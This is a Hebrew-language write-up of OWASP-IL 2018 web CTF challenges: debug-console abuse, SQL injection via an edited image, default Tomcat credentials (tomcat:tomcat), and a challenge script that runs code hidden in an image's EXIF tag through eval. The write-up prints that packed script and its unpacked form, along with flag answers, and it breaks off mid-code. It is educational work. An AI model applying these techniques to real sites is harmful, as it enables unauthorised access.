---
title: "OWASP-IL writeups"
category: "web"
subcategory: "sqli"
type: "writeup"
tags: ["web", "sqli", "exiftool", "exif", "wordpress", "web-exploitation"]
summary: "web writeup for \"challenge set\" from OWASP-IL - techniques: sqli, exiftool, exif, wordpress, web-exploitation."
source:
  name: "Dvd848/CTFs"
  url: "https://github.com/Dvd848/CTFs/blob/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/README.md"
ctf:
  name: "OWASP-IL"
  year: 2018
---

## Source

- **CTF:** OWASP-IL 2018
- **Repository:** [Dvd848/CTFs](https://github.com/Dvd848/CTFs)
- **File:** <https://github.com/Dvd848/CTFs/blob/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/README.md>

---
<h1 align=center dir=RTL style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Times New Roman",serif'>פתרון - </span><span
lang=en-IL dir=LTR>OWASP IL 2018 AppSec CTF</span></h1>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=HE style='font-family:"Arial",sans-serif'>מאת
</span><span lang=EN-US dir=LTR>Dvd848</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=EN-US dir=LTR>&nbsp;</span></p>
<h2 dir=RTL style='text-align:right;direction:rtl;unicode-bidi:embed'><span
lang=HE style='font-family:"Times New Roman",serif'>הקדמה</span></h2>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>בתחילת ספטמבר 2018
התקיים </span><span lang=EN-US dir=LTR>CTF</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span> של </span><span
lang=EN-US dir=LTR>OWASP IL</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span>. הוא היה פתוח למשך
קצת יותר מיממה וכלל 15 אתגרים ברמות קושי שונות.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<h2 dir=RTL style='text-align:right;direction:rtl;unicode-bidi:embed'><span
lang=HE style='font-family:"Times New Roman",serif'>אתגר 1 </span><span
lang=HE style='font-family:"Arial",sans-serif'>–</span><span lang=HE
style='font-family:"Times New Roman",serif'> </span><span lang=EN-US dir=LTR>devDucks</span><span
dir=RTL></span><span lang=HE style='font-family:"Times New Roman",serif'><span
dir=RTL></span> (רמת קושי קלה, 200 נקודות)</span></h2>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הוראות האתגר:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=EN-US dir=LTR><img width=126 height=126
id="Picture 1" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image001.jpg"></span></p>
<p align=center style='text-align:center'><span lang=en-IL>URL: <span
class=MsoHyperlink><b><a href="http://challenges.owaspil.ctf.today:8089/">http://challenges.owaspil.ctf.today:8089/</a></b></span></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>פתרון:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>לחיצה על הקישור
מובילה לדף שמציג שגיאת זמן ריצה של פייתון:</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=575 height=288
id="Picture 2" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image002.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>אפשר לעבור על ה-</span><span
lang=EN-US dir=LTR>Traceback</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> ולראות את ה-</span><span
lang=EN-US dir=LTR>state</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> של כל פונקציה בזמן
השגיאה.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>למשל, אם מחפשים קוד
שנכלל באפליקציה עצמה (בניגוד לקוד של ספריות עזר), מגיעים לקטע הבא:</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=602 height=350
id="Picture 3" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image003.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>אפשר לראות פה מספר
שורות קוד מתוך האפליקציה, אך לא משהו מועיל במיוחד. מה שנראה הרבה יותר מועיל הוא
הסמל של ה-</span><span lang=EN-US dir=LTR>Console</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span> שמופיע
מימין.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>לחיצה עליו ויש לנו </span><span
lang=EN-US dir=LTR>Console</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> אינטראקטיבי!</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:rtl;
unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=255 height=57
id="Picture 4" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image004.png"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>מפה הדרך אל הדגל
קצרה:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:rtl;
unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=362
height=277 id="Picture 5" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image005.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הדגל: </span><b><span
lang=EN-US dir=LTR>OWASP-IL{D3bug_p1ns_ar3_important}</span></b></p>
<b><span lang=EN-US style='font-size:13.0pt;line-height:107%;font-family:"Calibri Light",sans-serif;
color:#2F5496'><br clear=all style='page-break-before:always'>
</span></b>
<h2 dir=RTL style='text-align:right;direction:rtl;unicode-bidi:embed'><span
lang=HE style='font-family:"Times New Roman",serif'>אתגר 2 - </span><span
lang=EN-US dir=LTR>OWASP University</span><span dir=RTL></span><span lang=HE
style='font-family:"Times New Roman",serif'><span dir=RTL></span> (רמת קושי
קלה, 250 נקודות)</span></h2>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הוראות האתגר:</span></p>
<p><span lang=en-IL>We got anonymous tip about a terrorist in OWASP University,<br>
We're afraid she will try to attack in few days.<br>
Please help us catch her!<br>
We have her old student card and we know you will have the information you need
there, the problem is that she somehow changed her security code...<br>
<strong>Image size must be: 1597 x 1033</strong></span></p>
<p><span lang=en-IL>URL: <span class=MsoHyperlink><b><a
href="http://challenges.owaspil.ctf.today:8099/">http://challenges.owaspil.ctf.today:8099/</a></b></span></span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=271
height=175 id="Picture 6" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image006.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>פתרון:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>כניסה לאתר מובילה אל
הדף הבא:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=421
height=292 id="Picture 11" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image007.png"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>לחיצה על </span><span
lang=EN-US dir=LTR>Enter</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> מקפיצה חלון של
העלאת קובץ. אם מנסים להעלות את כרטיס הסטודנט, מקבלים את ההודעה הבאה:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=261
height=58 id="Picture 12" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image008.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>האתגר טען ש&quot;כל
המידע שאנחנו צריכים נמצא בכרטיס&quot;, לכן הדבר הראשון שעשיתי היה לנסות לנתח את
התמונה כדי למצוא מידע נסתר.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>ראשית השתמשתי ב-</span><span
lang=EN-US dir=LTR>exiftool</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> כדי לסרוק את ה-</span><span
lang=EN-US dir=LTR>metadata</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> של התמונה. במקרים
רבים אפשר למצוא שם רמזים חשובים. הפעם, הדבר היחיד שבלט לעין היה ה-</span><span
lang=EN-US dir=LTR>Thumbnail</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span>:</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=602 height=58 id="Picture 7"
src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image009.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>פורמט </span><span
lang=EN-US dir=LTR>JPEG</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> כולל אפשרות לכלול </span><span
lang=EN-US dir=LTR>Thumbnail</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> (גרסה זעירה של
התמונה עצמה) בתוך ה-</span><span lang=EN-US dir=LTR>header</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span> של התמונה
הגדולה, מה שאמור לסייע בניהול מספר רב של תמונות (למשל, תוכנה להצגת תמונות יכולה
להציג את ה-</span><span lang=EN-US dir=LTR>thumbnail</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span> כאשר צופים
בכל התמונות יחדיו, במקום לבצע פעולה יקרה של הקטנת כל תמונה ותמונה לגודל הרצוי
עבור תצוגה זו). בתיאוריה, התמונה הקטנה לא חייבת להיות דומה לתמונה הגדולה, מדובר
במידע בינארי עצמאי שכמובן אפשר לקבוע שרירותית בעזרת הכלים המתאימים. כלומר, אם
התוקפת שינתה את התמונה הגדולה אבל שכחה לשנות את ה-</span><span lang=EN-US
dir=LTR>thumbnail</span><span dir=RTL></span><span lang=HE style='font-family:
"Arial",sans-serif'><span dir=RTL></span>, אולי ניתן יהיה לזהות את הקוד המקורי
שלה לפני השינוי.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>בפועל, הכיוון הזה
לא הצליח כי הגרסה המוקטנת הייתה דומה לגרסה המקורית.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>משם, עברתי לחפש קבצים
נסתרים בתוך התמונה (ניתן למשל לכלול קובץ ארכיון מיד אחרי המידע הבינארי של
התמונה עצמה), אך גם שם לא מצאתי משהו מיוחד:</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=593 height=100
id="Picture 8" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image010.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>זה השלב שבו נזכרתי
באגדה על מישהו שביצע </span><span class=MsoHyperlink><span lang=EN-US><a
href="https://hackaday.com/2014/04/04/sql-injection-fools-speed-traps-and-clears-your-record/"><span
dir=LTR>SQL Injection</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> כנגד מצלמת מהירות</span></a></span></span><span
lang=HE style='font-family:"Arial",sans-serif'>:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=480
height=360 id="Picture 10" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image011.jpg"
alt="https://hackadaycom.files.wordpress.com/2014/04/18mpenleoksq8jpg.jpg?w=636"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'> בניסיון הראשון
ניסיתי לערוך את שדה ה-</span><span lang=EN-US dir=LTR>Security code</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>, אך זה לא עבד. השלב ההגיוני הבא היה לערוך את שם המשתמש:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=511
height=331 id="Picture 13" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image012.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>התוצאה:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=347
height=239 id="Picture 14" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image013.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>רפרנס ל</span><span
class=MsoHyperlink><span lang=EN-US><a href="https://xkcd.com/327/"><span
lang=HE style='font-family:"Arial",sans-serif'>קומיקס המיתולוגי של </span><span
dir=LTR>xkcd</span></a></span></span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span>:</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=602 height=185
id="Picture 15" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image014.jpg" alt="Exploits of a Mom"></span></p>
<span lang=HE dir=RTL style='font-size:11.0pt;line-height:107%;font-family:
"Arial",sans-serif'><br clear=all style='page-break-before:always'>
</span>
<p class=MsoNormal><span lang=HE dir=RTL style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<h2 dir=RTL style='text-align:right;direction:rtl;unicode-bidi:embed'><span
lang=HE style='font-family:"Times New Roman",serif'>אתגר 3 - </span><span
lang=EN-US dir=LTR>No pain no gain</span><span dir=RTL></span><span lang=HE
style='font-family:"Times New Roman",serif'><span dir=RTL></span> (רמת קושי
קלה, 250 נקודות)</span></h2>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הוראות האתגר:</span></p>
<p><span class=MsoHyperlink><span lang=en-IL><a
href="https://www.youtube.com/watch?v=1Wh8RzcQZr4">https://www.youtube.com/watch?v=1Wh8RzcQZr4</a></span></span></p>
<p><span lang=en-IL>URL: <span class=MsoHyperlink><b><a
href="http://challenges.owaspil.ctf.today:8092/">http://challenges.owaspil.ctf.today:8092/</a></b></span></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>פתרון:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>ההוראות מפנות
לסרטון שנקרא &quot;</span><span lang=en-IL dir=LTR>Hilarious Cat Fails</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>&quot;.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>האתר עצמו הוא אתר
תדמיתי לחברת שקר כלשהי, כאשר הקלט היחיד הבולט לעין הוא מקום להכניס כתובת
אימייל:</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=601 height=159
id="Picture 16" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image015.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>אולם, הכיוון הזה לא
מוביל לשום מקום.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הצעד הבא היה לנסות
לסייר קצת באתר, למשל – לנסות להיכנס לכתובת שלא קיימת:</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=602 height=152
id="Picture 17" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image016.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>ה-</span><span
lang=EN-US dir=LTR>Apache Tomcat</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> הזכיר לי את ה-</span><span
dir=LTR></span><span lang=en-IL dir=LTR><span dir=LTR></span> Cat Fails</span><span
lang=HE style='font-family:"Arial",sans-serif'>מהסרטון. איסוף מידע בגוגל אודות </span><span
lang=EN-US dir=LTR>Tomcat</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> גילה שקיים ממשק
ניהול בכתובת </span><span dir=LTR></span><span lang=EN-US dir=LTR><span
dir=LTR></span>/manager</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> (במקרה שלנו: </span><span
class=MsoHyperlink><span lang=EN-US><a
href="http://challenges.owaspil.ctf.today:8092/manager/"><span dir=LTR>http://challenges.owaspil.ctf.today:8092/manager</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>/</span></a></span></span><span lang=HE style='font-family:"Arial",sans-serif'>)
וכאשר ניסיתי להיכנס אליו, קיבלתי את המסך הבא:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=392
height=115 id="Picture 18" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image017.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>עוד קפיצה לגוגל
מגלה שברירת המחדל היא </span><span lang=EN-US dir=LTR>tomcat:tomcat</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>, ואנחנו בתוך ממשק הניהול:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=599
height=266 id="Picture 19" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image018.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>שימו לב לקישור הבא:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=453
height=161 id="Picture 20" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image019.png"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>לחיצה על הקישור
מובילה אל הדגל:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><b><span lang=en-IL dir=LTR>OWASP-IL{D0ntF0rg3tT0Ch4ng3D3f4ulTP455w0rds!}</span></b></p>
<b><span lang=en-IL style='font-size:11.0pt;line-height:107%;font-family:"Calibri",sans-serif'><br
clear=all style='page-break-before:always'>
</span></b>
<p class=MsoNormal><b><span lang=en-IL>&nbsp;</span></b></p>
<h2 dir=RTL style='text-align:right;direction:rtl;unicode-bidi:embed'><span
lang=HE style='font-family:"Times New Roman",serif'>אתגר 4 - </span><span
lang=EN-US dir=LTR>Curriculum Vitea</span><span dir=RTL></span><span lang=HE
style='font-family:"Times New Roman",serif'><span dir=RTL></span> (רמת קושי
קלה, 250 נקודות)</span></h2>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הוראות האתגר:</span></p>
<p><span lang=en-IL>I got client-side attack while i go to my CV landing page!</span></p>
<p><span lang=en-IL>Can you catch the flag?</span></p>
<p><span lang=en-IL>URL: <span class=MsoHyperlink><b><a
href="http://challenges.owaspil.ctf.today:8091/">http://challenges.owaspil.ctf.today:8091/</a></b></span></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>פתרון:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>לחיצה על הקישור
מובילה לאתר תדמיתי:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=602
height=214 id="Picture 21" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image020.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>בדיקה של קוד המקור
של האתר מגלה את הקוד החשוד הבא:</span></p>

```html
<script src="./exif-js/exif.js"></script>
<script>
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7(0(){9},c);"e 4";5.6=1;0 1(){8 a=b.3("d");2.f(a,0(){g(h(2.i(j,"k").l("").m().n("")))})}',24,24,'function|getExif|EXIF|getElementById|strict|window|onload|setInterval|var|debugger||document|100|profileImage|use|getData|eval|atob|getTag|this|Model|split|reverse|join'.split('|'),0,{}))
</script>
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>את הקוד אפשר לפענח
בעזרת ה-</span><span class=MsoHyperlink><span lang=EN-US><a
href="http://matthewfl.com/unPacker.html"><span dir=LTR>Unpacker</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span> הזה</span></a></span></span><span lang=HE style='font-family:
"Arial",sans-serif'>, למשל:</span></p>

```javascript
setInterval(function(){debugger},100);
"use strict";
window.onload=getExif;
function getExif(){
     var a=document.getElementById("profileImage");
     EXIF.getData(a,function(){ eval(atob(EXIF.getTag(this,"Model")
.split("").reverse().join("")))})
}
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>כלומר, הפונקציה
מריצה קוד שמופיע ב-</span><span lang=EN-US dir=LTR>metadata</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span> של תמונת הפרופיל של בעל האתר.</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=602 height=263
id="Picture 22" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image021.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>נראה שמדובר ב-</span><span
lang=EN-US dir=LTR>base64</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> (הפוך), לאחר היפוך
התהליך מקבלים:</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=602 height=239
id="Picture 23" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image022.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>(באותה מידה אפשר
לבצע את התהליך באמצעות ה-</span><span lang=EN-US dir=LTR>Web Developer Console</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span> של הדפדפן, או פשוט סקריפט בדף </span><span lang=EN-US dir=LTR>HTML</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>).</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>שוב נשתמש ב-</span><span
lang=EN-US dir=LTR>Unpacker</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> ונקבל:</span></p>

```javascript
function verify(a)
{
